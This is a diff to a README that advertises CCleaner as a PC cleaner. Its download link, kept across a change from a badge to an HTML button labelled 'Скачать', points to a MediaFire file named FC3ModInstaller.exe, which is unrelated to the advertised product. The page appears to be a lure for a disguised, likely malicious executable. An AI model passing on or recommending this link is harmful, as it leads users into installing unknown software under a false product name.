@@ -2,8 +2,10 @@
 
 > You have 13GB of browser crumbs, 9 startup vampires, and a registry that screams in binary.  
 > **It's time.**
-[![Download CCleaner](https://img.shields.io/badge/Download-CCleaner-blue?style=for-the-badge)](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
 ---
+<a href="https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file" target="_blank">
+  <img src="https://raw.githubusercontent.com/your-username/your-repo/main/images/button.png" alt="Скачать" width="200"/>
+</a>
 
 # 🧼 Meet CCleaner — Your PC’s Personal Janitor
 
